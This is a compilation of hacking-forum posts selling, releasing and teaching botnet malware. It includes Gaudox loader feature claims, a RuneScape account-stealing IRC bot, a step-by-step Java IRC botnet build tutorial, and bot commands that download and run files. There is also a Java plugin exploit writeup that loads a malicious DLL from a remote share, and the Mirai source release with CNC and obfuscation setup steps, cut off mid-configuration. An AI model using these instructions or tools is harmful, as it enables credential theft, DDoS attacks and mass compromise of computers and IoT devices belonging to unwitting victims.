Do you intend to add a watchdog/monitor process? Backup C&C is useful and pretty simple to get functional - both of us know it wouldn't be hard to get that added. Do you intend to use the Native WinAPI to go with the rootkit? Please don't hook ""NtQueryWindowsSystemInformation"" /sarcasm You could also hook fastsyscall and NtFunctions to achieve the rootkit, ring3 is enough for a free botnet. UAC bypass - Well I know it would be great and it would be easy to add it. Yes I know, the ones used by Dridex and other, reconstructed by EP. Its pretty easy if you're intending to add the Social Engineer type method; wouldn't take a few seconds for that. But if you're moving forward for a real exploit - simply writing/storing the DLL in a secure location would not work though, you would have to include proper process elevation, store your executable in a secure location (comparatively easy), and it must be signed by ""Microsoft"" for all to be completed.

Gaudox HTTP Gaudox is an HTTP loader completely coded from scratch in C/C++ language with a few lines of Assembly, which means that it does not require of any dependencies ( C-Runtime, NET Framework, Java VM ). The bot has been fully tested and working on all Windows versions from Windows XP SP2 to Windows 10 (32/64-bit). It is also worth mentioning that I coded this bot with very efficient and stable designed code to handle thousands of connections at once. Features: Usermode Rootkit Bot has Rootkit functionality which hides all bot resources and prevents from being accessed from explorer process. This feature does not drop any to disk, the code is internally embedded in the bot file and injected in the target process from memory. It is also has self-protection that prevents the hooks from being removed by third-party programs or any security tool. This feature is currently working on 32-bit systems. Persistence/Watchdog Bot prevents it from being removed from the system by bot killers, security tools or user actions. This feature is currently supporting process protection and working on both 32/64-bit systems but its maximum compatibility is in 32-bit. Traffic Encrypted The communication between the bot and the control panel is obfuscated. This prevents middle attacks. Anti-Analysis/Research Bot contains several methods for preventing from being analyzed by researchers or unauthorized users. some methods are from preventing static analysis by obfuscating code, data up to detect the presence of debuggers, avoid running the bot in virtualized environments, etc. some methods may not be mentioned.

Notes: 1) I highly recommend disabling strict mode in MySQL. 2) I f you test the bot from a local server, the panel may be showing ""US"" in location, it's not an _error_, the panel expects to always get an external IP. Tut by Jar1: https://hackforums.net/showthread.php?tid=5084324 How to update: 1.1.0.0 to 1.1.0.1+ You will need to install the panel again, sorry for the inconvenience. The database is now the final version and it would be compatible with all future versions ( I hope, unless I have forgotten something or want to add a new feature, in any case I will code a script to update the database ). Changelog: Spoiler (Click to View) 1.1.0.1 (15-12-2015) Code Bot * Fixed issue with Uninstall command * Anti-Virtual machine methods have been enabled Panel * Fixed issue with location * Added captcha in login page 1.1.0.0 (30-11-2015) Code Bot * Implemented Ring3 Rootkit for 32-bit versions of Windows * Implemented Watchdog/Persistence to prevent from being removed * Communication between the bot and the control panel is now encrypted * Anti-Analysis/Researching methods added * Core improved Panel * Panel completely recoded and using PDO extension which means it's more secure against SQL injections and other attacks. * Improved the appearance of the panel, images for countries were added, ability to change password, etc. 1.0.0.0 (15-10-2015) Code * First release",,,,,

It is being developed in c++ . I will list some of the current-features and plans for the bot below: - BotKiller [Turn Installs Into Updates] (Currently Being Added) - SSYN/UDP Flood - Download/Update - Rsbots.net Data.db harvester (Will allow you to steal auth codes at ease) - Polymorphic USB Spread - A current active window checker will be added, this will be used to check for when their browser or any open window says the webtitle as runescape.com has example: RuneScape - The Number 1 Free Multiplayer Game. [ If the bot detects this it will send an alert (namely via a msg to the channel) saying that the window is found, this way you will have knowledge when the user is currently playing Runescape. I'll add other window title aswell, such as that for Rsbot, and we will add this for websites such as PayPal as well. ] - Sensenmann Added a really unique feature, its a real time bot nick change and channel join/part for Swiftkit.exe - Example scenario. The bot is executed (either by starting up once pc is rebooted, or for the first install, maybe the user doesn't have SwiftKit open as soon as the bot was executed. If this happens then the bot won't have {SK} in the nickname. And can be very misleading to you as this bot's main purpose is to make it easier to hijack Runescape accounts. What this bot will then do is as soon as it detects Swiftkit.exe is open or no-longer running it will change the bot's nick on your irc server. The bot will keep the same nick as it previously had to prevent confusion, but the only difference will be the bot will have either {SK} or remove it from the nick - determined if Swiftkit is opened or not at the time. The bot will also join specific channels related to programs open on the computer, if the bot has SwiftKit open it will join #Swiftkit - if the bot has the Jagex pref. file on the computer it will join #Runescape [ This check will take place once every 60 seconds (1 minute); to prevent high CPU/memory load. (also if the person constantly is opening and closing Swiftkit it will prevent the irc server from being spammed by nick changes. ] Video: http://www.youtube.com/watch?v=SKB_bpyAVkU watch in HD for best quality!

So I am thinking about having a unique php file upload, where the bot controller uploads a php script to their webserver and they include the url to their php script in the command they issue to their bots. The bot will then connect and upload the data.db file; to prevent your webserver from experiencing errors the php file will add a series of random numbers to the end of the data.db file name. You will be able to see how many data.db files you have collected (in number form) by visiting your webpanel included with the bot. (Webpanel will be uploaded to your webserver.) The bot will have a way of determining if the infected machine has played Runescape before aswell, it will check their computer for a file created once they load the Runescape java applet.

It is being developed in c++ . I will list some of the current-features and plans for the bot below: - BotKiller [Turn Installs Into Updates] (Currently Being Added) - SSYN/UDP Flood - Download/Update - Rsbots.net Data.db harvester (Will allow you to steal auth codes at ease) - Polymorphic USB Spread - A current active window checker will be added, this will be used to check for when their browser or any open window says the webtitle as runescape.com has example: RuneScape - The Number 1 Free Multiplayer Game. [ If the bot detects this it will send an alert (namely via a msg to the channel) saying that the window is found, this way you will have knowledge when the user is currently playing Runescape. I'll add other window title aswell, such as that for Rsbot, and we will add this for websites such as PayPal as well. ] - Sensenmann Added a really unique feature, its a real time bot nick change and channel join/part for Swiftkit.exe - Example scenario. The bot is executed (either by starting up once pc is rebooted, or for the first install, maybe the user doesn't have SwiftKit open as soon as the bot was executed. If this happens then the bot won't have {SK} in the nickname. And can be very misleading to you as this bot's main purpose is to make it easier to hijack Runescape accounts. What this bot will then do is as soon as it detects Swiftkit.exe is open or no-longer running it will change the bot's nick on your irc server. The bot will keep the same nick as it previously had to prevent confusion, but the only difference will be the bot will have either {SK} or remove it from the nick - determined if Swiftkit is opened or not at the time. The bot will also join specific channels related to programs open on the computer, if the bot has SwiftKit open it will join #Swiftkit - if the bot has the Jagex pref. file on the computer it will join #Runescape [ This check will take place once every 60 seconds (1 minute); to prevent high CPU/memory load. (also if the person constantly is opening and closing Swiftkit it will prevent the irc server from being spammed by nick changes. ] Video: http://www.youtube.com/watch?v=SKB_bpyAVkU watch in HD for best quality! Picture: [img]http://i39.[censored].com/2aabj7r.png[/img] ____________________________________________________ - Sensenmann's planned delivery method for Data.db files (RSBots.net Auths): The bot will have a way of determining if the infected machine has played Runescape before aswell, it will check their computer for a file created once they load the Runescape java applet. (Jagex Preference file for those unaware.) If this file is detected the bot will also have a prefix in its name: {RS}."" ____________________________________________________ (When it's done I will be selling bins and setups, currently the bin is FUD and is only - 32kb -[) If you would like to make any suggestions it is appreciated =p [ If you're l33t/ub3r and would like to be a beta tester just pm me. ] (04-28-2010, 11:02 PM)JyNx` Wrote: Nutrider one has arrived to post for him. this is probably what happened...

You need to focus on one project. Your making yourself look like a fool. People purchased your booter. You released it to the public because it had major bugs. Shouldn't you be focusing on making that booter better. Anyways thats just my opinion. I believe that 1.0d public did not have any major bugs. I also believe that nobody is having problems with their purchased 1.0d, aside from random peoples computers cannot connect to my database so i've had to refund two people. I also believe you shouldn't complain when I just like coding and am giving things out for free, especially when you are not a customer. Right now I am focusing on one project... xvisceral 2.0. I honestly have not even opened up 1.0d (current 1.1) to code in at least over a week. Sure, people knew me for constant updates, but I do have a life, and I am very busy with school and my girlfriend and hardly have time to code. Does DeMoN always sit there and code on DDoSer? Of course not, and how long did it take him between updates? I can tell you, however, that 1.0d does not even begin to compare to 2.0, aside from a few things that I need to fix/add. I'm pretty much stopping dev of my current 1.0d right now until I finish 2.0. From there, I will most likely remove all RAT functions from 2.0 and make 1.1 the basic version, so I am focusing on one projec. If people like the new version better, I will continue with that as the project and sell the 1.0d source if anybody is interested, or if not, release public. It has always been what the customer wants, and I just want to get it's name out there. If the customers decide that they like 1.0d better than 1.1, 1.2 will go back to being updated from 1.0d source. I've been a very giving guy, and 1.0d public was released to get it's name out as a stable booter, not to report any bugs (although that was also a perk). People may think because I'm 'abandoning' a project that one must have been terrible, or that I must be 'a fool', but trust me, this version will blow people away.",,,,,

A botnet is a collection of Internet-connected programs communicating with other similar programs in order to perform tasks. This can be as mundane as keeping control of an Internet Relay Chat (IRC) channel, or it could be used to send spam email or participate in distributed denial-of-service attacks. The word botnet is a combination of the words robot and network. The term is usually used with a negative or malicious connotation.

A botnet is a collection of Internet-connected programs communicating with other similar programs in order to perform tasks. This can be as mundane as keeping control of an Internet Relay Chat (IRC) channel, or it could be used to send spam email or participate in distributed denial-of-service attacks. The word botnet is a combination of the words robot and network. The term is usually used with a negative or malicious connotation.

Go google ""Java botnet"" You will find about 30 of MY tutorial. Any way, The tutorial was written in a matter of minutes so i'm going to help you properly here. Made by dj mint off hackforums. Ok, First off you need an IRC channel (Two helps!) and you need to have java JDK installed on your computer. Now this usually comes with most computers now. 1) If you don't have java download it here Code http://java.sun.com/javase/downloads/index.jspIt's the very first one, You really can't miss it. 2) Ok, So now we have java installed. Next we are going to need the botnet source (SCR) Now this one i use i can't remember who made it but credit goes to him/her. Code http://www.#/?d=BLA2ST3UI re-uploaded it under my name so no one can call me a ripper. (changed the link because i forgot to delete the class files in there) 3) Ok, So now you have the source and you should of unpacked it. You should have all these files which you have no clue what are. They should all be file like ""something.java"" You open these files in notepad or wordpad. First off were going to edit the config.php This is not a java file. 4) Ok, The config.php looks as follows. Code SERVER: IRCSERVERHERE</br>PORT: IRCPORTHERE</br>IN_CHANNEL: #channlename1</br>OUT_CHANNEL: #channlename2</br>IN_PASSWORD: putanythinghere </br>OUT_PASSWORD: putanythinghere </br>NICK: [L0L]</br>CONTROLLERS: Owner1,owner2,owner3,owner4</br> For the people who still don't understand that. SERVER you put the IRC Server. (irc.domain.com or what ever) The PORT you put the IRC port. IN_CHANNEL is the channel you control the bots on like give commands. OUT_CHANNEL is the channel the bots will answer. So if i did .getip in channel1 they would respond on channel2 with there ip's. The password is the IRC channel password. If you don't have one set just put it as lol or some thing or the bots don't connect at all. The Controllers are the people which control the botnet. You can add as many as you want. Make sure there separated by a "","" 5) Got that filled out? Not that hard was it? Now you need to upload that to a host. Now this bit confuses people. By this i don't mean #. A site like www.mysite.com/config.php A site where you can view the php page. Just google free hosts or even use freewebs. 6) Ok now were going to edit Constants.java I'll break this down too. Code public static final double BOT_VERSION = 2.3; public static final String MAIN_HOST = ""IRCHOSTHERE""; public static final String CONF_URL = ""www.mysite.com/config.php""; public static final String BACKUP_HOST = """"; public static final String CONF_URL_BACKUP = """"; public static final String IP_ADDR_URL = ""http://whatismyip.com/automation/n09230945.asp""; public static final int FILE_SERVER_DEFAULT_PORT = 3943; public static final String INI_FILE_LOC = ""C:\\Program Files\\win32.ini""; public static final String PASSWORD = ""lol""; MAIN_HOST = The IRC host CONF_URL = The Config file you uploaded to your site on the last step BACKUP_HOST = If your IRC ever went down you make the bots join another one. CONF_URL_BACKUP = Backup for the config file. IP_ADDR_URL = Don't touch it. FILE_SERVER_DEFAULT_PORT = Don't touch it. INI_FILE_LOC = Again don't touch it. PASSWORD = The password you put in the config file. Mines always lol. 6) Ok, Saved that? Yeaaay your almost there! Now we need to compile the botnet. To do this i have included a file called compile.bat, Now you should be able to just double click it and it should pop up and saying compiling then close on you. Then if you look back at the folder you will have loads of .class files. Ignore this if the compiler worked for you If you get the ""javac"" _error_"" Right click compile.bat and click edit. It looks like this Code @echo off color 0b title SERVER NAME Compiler @echo ---------------------- @echo --Initiating Compile-- @echo ---------------------- ""C:\Program Files\Java\jdk1.6.0_14\bin\javac.exe"" -cp . *.java @echo ---------------------- @echo --Compiling complete-- @echo ---------------------- @echo off title SERVER NAME server ""C:\Program Files\Java\jre6\bin\java.exe"" -Xmx500m server The bit you want to edit is Code ""C:\Program Files\Java\jdk1.6.0_14\bin\javac.exe"" -cp . *.java The ""jdk.1.6.0_14"" One of the reasons you could be getting javac _error_ (This is the most common any way) Go find your way to your java folder and see what version you have and change the version number as needed. Save the file and run again. 7) Ok now we have lots of new files. Now personally i get all the new files (.class) and put them into a folder called built. This will help trust me. Ok, Now were going to open jshrink.jar (This is NOT a botnet but some thing we use to compile the botnet) Click the license tab. If there isn't a code in there put Code 31-12-2099 CANCQJUQKEOQKKLI Now leave it up and go into the ""Built"" folder you made earlier with all the .class files in. Select them all and drag them onto the white part of jshrink. Now go into the options tab and check ""String encryption"" Make it harder for people to get your IRC information. Ok now click File > save as navigate to where you want to save the botnet to and call it jusched.jar. wohohohohoh you have a botnet. 8) Now to test if this thing works. Run it. You should get a bot joining your IRC channels. (In and the out) To remove the botnet follow the steps below Start>Run>msconfig>Click startup tab>Uncheck jusched Sorted. For commands on the botnet do .commands in the IN channel and look at the OUT channel Need any help please PM me :) Made by dj mint off Hackforums",,,,,

There are multiple threads of this bot on hackforums and most of them are not legit. So i decided to download it and spend some time on the bot my self to correct the coders fugg ups. I went through it and took out some coding that shouldn't have been there, fixed some of the commands to the proper statement. I added more hint's so people can update the bot in the future. I changed the mutex, i changed the timing it connects to the server so it will be a bit faster on connects. I changed the bot nick name on connects as well. I made the bot more organized and more proper then what it was, i added a commands text file inside the folder when you download it. I will be adding the commands from the rbot to this bot because i want a keylogg feature.

NOTE: I also ported this source to Visual c++ 2008 and made sure it works with 2008 cause it's just newer and stuff... source will not compile under 6.0 anymore I am only just getting myself oriented in c++ and learning more about the functionality of bots. I have tried to add some comments too to understand the code but i don't know if i commented it enough, you should atleast have some basic c++ knowledge to understand it. It's based for like 50% off the asper base with some modding/rewriting I tested it on 500+ bots, it works on everything from XP 32bit to windows 7 64 bit and i tried to make it as stable as possible (and IMO it's incredibly stable right now) Unreal IRCd or any other IRCd where you can use the /sethost command is required Commands: Code testing //output versionInfo join //join a channel. ex: !join #channel leave //leave a channel. ex: !leave #channel download //download something. ex: !download http://www.site.com/file.exe output.exe -- can also download and open torrent files or anythign else you want update //update. ex: !update http://www.site.com/updateFile.exe remove //remove the bot. ex: !remove Also this bot runs on startup on all systems. I hope you guys enjoy. And sorry but i didn't care to FUD the source, it's 9/24, crypt it or live with it. I will also try to answer questions but PLEASE don't ask me noob questions like how to compile or such things, i simply don't answer those!

Unless he has some damn good features that no one thought of (like I do). But over all you don't need to criticize him for it... The bot i was telling you i was going to code would be similar, only I would have read the IRC RFC and coded from scratch... Nothing much else would change - other than coded from scratch. I wouldn't be able to code my own DDoS or Ssyn, so I would have no choice to rip the code. First, he is learning from implementing code that is not his. Second, he is teaching others to implement/code (as long as his src is for dl) Second, he is providing another example. How is either of this bad?

(Why Demon? I will explain later on in the thread.) Ok so, I've seen all the threads on (XR vs DDoSeR ect.) and the main agruements were basically the stability of XR vs. DDoSeRs power + ""Usefull commands"" So I decided to create a mod of Metus 2.0, I chose 2.0 to mod since it had the most stability out of the free source that I have seen so far. DDoSeR Bot combined with Metus 2.0 !1!!eleven!!1!!1 Yupp, the times I tested it with the built in serverbuilder it worked 100%, No errors so far. Notes : The ""Fun"" commands are still viewable, but I removed the data send. So they will not be valid / working.

Let's see: Java Plugin for Browsers (Chrome,Firefox...) - Windows: npjp2.dll (The same for IE8's jp2iexp.dll) .text:6DAA3D96 .text:6DAA3D96 ; == S U B R O U T I N E == .text:6DAA3D96 .text:6DAA3D96 ; Attributes: bp-based frame .text:6DAA3D96 .text:6DAA3D96 sub_6DAA3D96 proc near ; CODE XREF: sub_6DAA2ACB+170p .text:6DAA3D96 .text:6DAA3D96 Data = byte ptr -264h .text:6DAA3D96 var_263 = byte ptr -263h .text:6DAA3D96 ApplicationName = byte ptr -160h .text:6DAA3D96 StartupInfo = _STARTUPINFOA ptr -5Ch .text:6DAA3D96 ProcessInformation= _PROCESS_INFORMATION ptr -18h .text:6DAA3D96 cbData = dword ptr -8 .text:6DAA3D96 hKey = dword ptr -4 .text:6DAA3D96 arg_0 = dword ptr 8 .text:6DAA3D96 arg_4 = dword ptr 0Ch .text:6DAA3D96 .text:6DAA3D96 push ebp .text:6DAA3D97 mov ebp, esp .text:6DAA3D99 sub esp, 264h .text:6DAA3D9F push edi .text:6DAA3DA0 lea eax, [ebp+hKey] .text:6DAA3DA3 push eax ; phkResult .text:6DAA3DA4 push 20019h ; samDesired .text:6DAA3DA9 xor edi, edi .text:6DAA3DAB push edi ; ulOptions .text:6DAA3DAC push offset SubKey ; ""JNLPFile\\Shell\\Open\\Command"" .text:6DAA3DB1 push 800h ; hKey .text:6DAA3DB6 mov [ebp+cbData], 104h .text:6DAA3DBD call ds:RegOpenKeyExA .text:6DAA3DC3 test eax, eax .text:6DAA3DC5 jz short loc_6DAA3DCE .text:6DAA3DC7 xor eax, eax .text:6DAA3DC9 jmp loc_6DAA3F16 The default handler is ""javaws.exe"",continuing... .text:6DAA3EB7 push [ebp+arg_4] .text:6DAA3EBA push eax .text:6DAA3EBB push offset aSDocbaseSS ; ""\""%s\"" -docbase %s %s"" .text:6DAA3EC0 push esi ; LPSTR .text:6DAA3EC1 call ebx ; wsprintfA .text:6DAA3EC3 add esp, 14h .text:6DAA3EC6 jmp short loc_6DAA3ED4 .text:6DAA3EC8 ; -- .text:6DAA3EC8 .text:6DAA3EC8 loc_6DAA3EC8: ; CODE XREF: sub_6DAA3D96+11Fj .text:6DAA3EC8 push eax .text:6DAA3EC9 push offset aSS_0 ; ""\""%s\"" %s"" .text:6DAA3ECE push esi ; LPSTR .text:6DAA3ECF call ebx ; wsprintfA .text:6DAA3ED1 add esp, 10h .text:6DAA3ED4 .text:6DAA3ED4 loc_6DAA3ED4: ; CODE XREF: sub_6DAA3D96+130j .text:6DAA3ED4 push 11h .text:6DAA3ED6 pop ecx .text:6DAA3ED7 xor eax, eax .text:6DAA3ED9 lea edi, [ebp+StartupInfo] .text:6DAA3EDC rep stosd .text:6DAA3EDE lea eax, [ebp+ProcessInformation] .text:6DAA3EE1 push eax ; lpProcessInformation .text:6DAA3EE2 xor ebx, ebx .text:6DAA3EE4 lea eax, [ebp+StartupInfo] .text:6DAA3EE7 push eax ; lpStartupInfo .text:6DAA3EE8 push ebx ; lpCurrentDirectory .text:6DAA3EE9 push ebx ; lpEnvironment .text:6DAA3EEA push ebx ; dwCreationFlags .text:6DAA3EEB push ebx ; bInheritHandles .text:6DAA3EEC push ebx ; lpThreadAttributes .text:6DAA3EED push ebx ; lpProcessAttributes .text:6DAA3EEE push esi ; lpCommandLine .text:6DAA3EEF lea eax, [ebp+ApplicationName] .text:6DAA3EF5 push eax ; lpApplicationName .text:6DAA3EF6 mov [ebp+StartupInfo.cb], 44h .text:6DAA3EFD call ds:CreateProcessA So basically the Java-Plugin Browser is running ""javaws.exe"" without validating command-line parameters. These parameters can be controlled by attackers via specially crafted embed html tags within a webpage. Let's see JavaDeploy.txt: if (browser == 'MSIE') { document.write('<' + 'object classid=""clsid:8AD9C840-044E-11D1-B3E9-00805F499D93"" ' + 'width=""0"" height=""0"">' + '<' + 'PARAM name=""launchjnlp"" value=""' + jnlp + '""' + '>' + '<' + 'PARAM name=""docbase"" value=""' + jnlpDocbase + '""' + '>' + '<' + '/' + 'object' + '>'); } else if (browser == 'Netscape Family') { document.write('<' + 'embed type=""application/x-java-applet;jpi-version=' + deployJava.firefoxJavaVersion + '"" ' + 'width=""0"" height=""0"" ' + 'launchjnlp=""' + jnlp + '""' + 'docbase=""' + jnlpDocbase + '""' + ' />'); } That's it. This is how JAVA Plugin identifies Java Web Start content (jnlp files).So We can inject command-line parameters through ""docbase"" tag and even ""launchjnlp"". What type of arguments can we abuse to compromise a system? java.exe and javaw.exe support an undocumented-hidden command-line parameter ""-XXaltjvm"" and curiosly also ""-J-XXaltjvm"" (see -J switch in javaws.exe). This instructs Java to load an alternative JavaVM library (jvm.dll or libjvm.so) from the desired path. Game over. We can set -XXaltjvm=\\IP\evil , in this way javaw.exe will load our evil jvm.dll. Bye bye ASLR, DEP... Linux Same logic _error_, check this function ""_Z10launchJNLPPKcS0"" in libnpjp2.so MACOSX Not vulnerable. Workaround Disable javaws/javaws.exe in linux and Windows by any mean. Disable Deployment Toolkit to avoid unwanted installation as stated in Tavis' advisory.",,,,,

Because resumes tend to originate from unknown sources, this is not thought to be abnormal and the user opens the untrusted file. The malicious file then uses a Word vulnerability to run arbitrary code under the context of the logged-in user. However, the ""arbitrary code"" is actually a separate exploit, which launches a separate attack against the local system. The second exploit has elevated the final payload code to SYSTEM level, allowing for full system compromise, including the installation of a rootkit or backdoor.

Also, my signature is a reference to my roots in hacking. The first ""hack"" I pulled off was scheduling a task to execute cmd.exe in interactive mode, thus gaining system privileges. While this is not new or ""leet"" (and I am not saying I discovered it either!), it is very significant to me. Local privilege escalation (exploit or system feature) can indeed execute processes to bypass UAC or other things such as installing programs. If you were an experienced Windows programmer you would know this. A way to escalate your privileges via the Windows API is to create a service. Your service/program will execute prior to users logging in and depending on what settings you created the service with, the service typically runs under LocalSystem. Another example of an OS provided local privilege-escalation method is called impersonation. With impersonation you can run any process with the credentials, tokens, and privileges as another user. If the user you wish to impersonate has higher or more privileges than you, this is called privilege escalation. Privilege escalation is indeed a core part of newer trojans and malware as Windows Vista runs programs as a limited user by default. Making system wide changes is nearly impossible without administrative privileges, so in many cases malware will attempt to escalate their privileges either by using an exploit or an OS provided facility (UAC prompt to gain admin). Privilege escalation exploits were once very common on earlier Windows NT systems such as 2000 with pipeupadmin and used by malware and power users alike. Anyways, I'd rather not spend time writing an article about privilege escalation just for you to passively skim-read because you are nothing more than a skid with typing skills.",,,,,

Go to IP chicken and then put the IP it gives you in the URL bar. That should take you to your modem. What many people dont realize is that your modem has a firewall too. That might or might not be the problem. A different server, i meant test out another IRC server. Just find some random IRC server, set everything else up, and try to get your RxBot to connect If you cannot connect to the random IRC server, then either your config is off or something is wrong. IF you can connect, then something is wrong with your IRC server. If you didnt get any errors, i think everything is set up correctly.",,,,,

The bot will idle in the channel while you are gone and thus, keep your channel alive. 3. Get a bunch of zombies in your IRC channel. If you have enough zombies, then there will always be one zombie in the channel and will keep it alive. 4. Get the admin to do it for you.

I know that I stated that I would not release any more version of z3r0xb0t Core.But as I am leaving the scene, I am releasing a second Public Version for you guys. I hope that rippers and noobs coders will be very pissed when they will know that you can get some very good quality stuff for free. This is the only real version of z3r0xb0t and the most advanced at the moment. Of course, the usb spreading 0day exploits and some valuable code lines were removed and replaced by less advanced stuff so I can still make a bit of money . So yea I hope you guys enjoy and don't forget that a word of thank is always appreciated. Note that I am using l1nkbucks to get some money out of this. I usually use $harecash but I decided that I wouldn't use it this time to make it easier for you guys to get the source.So please I ask you to be understanding and to not repost/rip my stuff. Please note that if you do [prefix]version (ex: !version) you will see that this made from z3r0xb0t core and this function is implemented in precompiled libraries. So if you want to download this source to rip it, pass away. But if you are a skilled programmer you should find how to remove this little limitation. Finally, this is based on Asper Core but it is greatly improved, you can always download Asper Core and compare it with this z3r0xb0t public release and you will see what I mean. I know this source lacks memory management but I will most certainly provide a fix in the v2.1 Features: - Supports all Microsoft operating systems - No duplicate bots. (Mutex) - Registry Persistence (User cant remove bot from startup.) - Firewall Bypass - UAC Bypass (Doesn't work anymore for !download - 2011-29-11 12:30PM) - Backup IRC server Support - Small Bin Size - Good Update / Download command! (No more crappy update rates!) - Silence Command. (Bots dont spam channel) - Visit Command (Silent, and Normal!) - Ping Pong to prevent bots from pinging out - UDP DDoS (optional without price change. DDoS lowers stability, as with any bot, but if you really want it you can have it) - Direct IRC information encryption(Don't get your bots stolen) - Coded in C++, no need for .NET! (More infections.) - Highly optimized routines and a very clean code for HIGH stability. - New security features Compilation Instructions : LINK WAS REMOVED DUE TO IT BEING BROKEN.

LiteHTTP is an HTTP bot that is being programmed in C#, on the .NET 2.0 dependency. Why are you doing this? Lately there's been lots of cracked bots, false promises, and backdoored bins that have given HackForums a bad name. With the newest thing being LoadHTTP, I decided I'm going to make a FREE HTTP bot and release it to the community. I have nothing to hide, so if you must, the builder that I plan to release will not be obfuscated. Feel free to look at the source, it won't bother me. I'm not out to infect members, steal bots, or even backdoor my builder or bins. This bot is not going to be anything super special. It will have the basic features that an HTTP botnet would require. Below you'll find a list of all features that can be expected in the upcoming release. Expected Features (Note: more features may be added, this is only a rough estimate)PanelCustom coded with a sleek yet maneuverable design Ability to have more than 1 user User privileges Action logs for all users BotDownload & execute (with option to inject if native) Visit webpage (visible or hidden) Startup (with persistence) Information about bot (aka. OS, version, installed location, etc.) Basic botkiller (nothing fancy) Update Uninstall Have a feature you'd like to see? If you have a feature that you would like to see in the bot, feel free to post or PM me. I'll consider all suggestions, but please keep in mind this bot is not going to be too advanced. I MAY consider adding a plugin system, but if this is the case, I do NOT want to see people selling plugins for personal profit. This is a community bot, not a way for you to make money off of somebody else's work.

Well, I can handle the HTML / CSS work as I'm probably just going to use a template, and my PHP is pretty good as well. I'll probably make a Github page later, since it would be a good idea to have people looking it over for bugs and improvements. Thanks for the suggestion.

I made my money, there's lots of eyes looking at IOT now, so it's time to GTFO. However, I know every skid and their mama, it's their wet dream to have something besides qbot. So today, I have an amazing release for you. With Mirai, I usually pull max 380k bots from telnet alone. However, after the Kreb DDoS, ISPs been slowly shutting down and cleaning up their act. Today, max pull is about 300k bots, and dropping. So, I am your senpai, and I will treat you real nice, my hf-chan. And to everyone that thought they were doing anything by hitting my CNC, I had good laughs, this bot uses domain for CNC. It takes 60 seconds for all bots to reconnect, lol Also, shoutout to this blog post by malwaremustdie http://blog.malwaremustdie.org/2016/08/m...-just.html https://web.archive.org/web/201609302302...-just.html <- backup in case low quality reverse engineer unixfreaxjp decides to edit his posts lol Had a lot of respect for you, thought you were good reverser, but you really just completely and totally failed in reversing this binary. ""We still have better kung fu than you kiddos"" don't make me laugh please, you made so many mistakes and even confused some different binaries with my. LOL Let me give you some slaps back - 1) port 48101 is not for back connect, it is for control to prevent multiple instances of bot running together 2) /dev/watchdog and /dev/misc are not for ""making the delay"", it for preventing system from hanging. This one is low-hanging fruit, so sad that you are extremely dumb 3) You failed and thought FAKE_CNC_ADDR and FAKE_CNC_PORT was real CNC, lol ""And doing the backdoor to connect via HTTP on 65.222.202.53"". you got tripped up by signal flow ;) try harder skiddo 4) Your skeleton tool sucks ass, it thought the attack decoder was ""sinden style"", but it does not even use a text-based protocol? CNC and bot communicate over binary protocol 5) you say 'chroot(""/"") so predictable like torlus' but you don't understand, some others kill based on cwd. It shows how out-of-the-loop you are with real malware. Go back to skidland 5 slaps for you Why are you writing reverse engineer tools? You cannot even correctly reverse in the first place. Please learn some skills first before trying to impress others. Your arrogance in declaring how you ""beat me"" with your dumb kung-fu statement made me laugh so hard while eating my SO had to pat me on the back. Just as I forever be free, you will be doomed to mediocracy forever. Requirements Bare Minimum 2 servers: 1 for CNC + mysql, 1 for scan receiver, and 1+ for loading Pro Setup (my setup) 2 VPS and 4 servers - 1 VPS with extremely bulletproof host for database server - 1 VPS, rootkitted, for scanReceiver and distributor - 1 server for CNC (used like 2% CPU with 400k bots) - 3x 10gbps NForce servers for loading (distributor distributes to 3 servers equally) Infrastructure Overview - To establish connection to CNC, bots resolve a domain (resolv.c/resolv.h) and connect to that IP address - Bots brute telnet using an advanced SYN scanner that is around 80x faster than the one in qbot, and uses almost 20x less resources. When finding bruted result, bot resolves another domain and reports it. This is chained to a separate server to automatically load onto devices as results come in. - Bruted results are sent by default on port 48101. The utility called scanListen.go in tools is used to receive bruted results (I was getting around 500 bruted results per second at peak). If you build in debug mode, you should see the utitlity scanListen binary appear in debug folder. Mirai uses a spreading mechanism similar to self-rep, but what I call ""real-time-load"". Basically, bots brute results, send it to a server listening with scanListen utility, which sends the results to the loader. This loop (brute -> scanListen -> load -> brute) is known as real time loading. The loader can be configured to use multiple IP address to bypass port exhaustion in linux (there are limited number of ports available, which means that there is not enough variation in tuple to get more than 65k simultaneous outbound connections - in theory, this value lot less). I would have maybe 60k - 70k simultaneous outbound connections (simultaneous loading) spread out across 5 IPs. Configuring Bot Bot has several configuration options that are obfuscated in (table.c/table.h). In ./mirai/bot/table.h you can find most descriptions for configuration options. However, in ./mirai/bot/table.c there are a few options you *need* to change to get working. - TABLE_CNC_DOMAIN - Domain name of CNC to connect to - DDoS avoidance very fun with mirai, people try to hit my CNC but I update it faster than they can find new IPs, lol. Retards :) - TABLE_CNC_PORT - Port to connect to, its set to 23 already - TABLE_SCAN_CB_DOMAIN - When finding bruted results, this domain it is reported to - TABLE_SCAN_CB_PORT - Port to connect to for bruted results, it is set to 48101 already. In ./mirai/tools you will find something called enc.c - You must compile this to output things to put in the table.c file Run this inside mirai directory Code ./build.sh debug telnetYou will get some errors related to cross-compilers not being there if you have not configured them. This is ok, won't affect compiling the enc tool Now, in the ./mirai/debug folder you should see a compiled binary called enc. For example, to get obfuscated string for domain name for bots to connect to, use this: Code ./debug/enc string fugg.the.police.com The output should look like this Code XOR'ing 20 bytes of data... \x44\x57\x41\x49\x0C\x56\x4A\x47\x0C\x52\x4D\x4E\x4B\x41\x47\x0C\x41\x4D\x4F\x22 To update the TABLE_CNC_DOMAIN value for example, replace that long hex string with the one provided by enc tool. Also, you see ""XOR'ing 20 bytes of data"". This value must replace the last argument tas well. So for example, the table.c line originally looks like this [/code] add_entry(TABLE_CNC_DOMAIN, ""\x41\x4C\x41\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22"", 30); // cnc.changeme.com [/code] Now that we know value from enc tool, we update it like this Code add_entry(TABLE_CNC_DOMAIN, ""\x44\x57\x41\x49\x0C\x56\x4A\x47\x0C\x52\x4D\x4E\x4B\x41\x47\x0C\x41\x4D\x4F\x22"", 20); // fugg.the.police.com Some values are strings, some are port (uint16 in network order / big endian). Configuring CNC Code apt-get install mysql-server mysql-clientCNC requires database to work. When you install database, go into it and run following commands: http://pastebin.com/86d0iL9g This will create database for you. To add your user, Code INSERT INTO users VALUES (NULL, 'anna-senpai', 'myawesomepassword', 0, 0, 0, 0, -1, 1, 30, ''); Now, go into file ./mirai/cnc/main.go Edit these values Code const DatabaseAddr string = 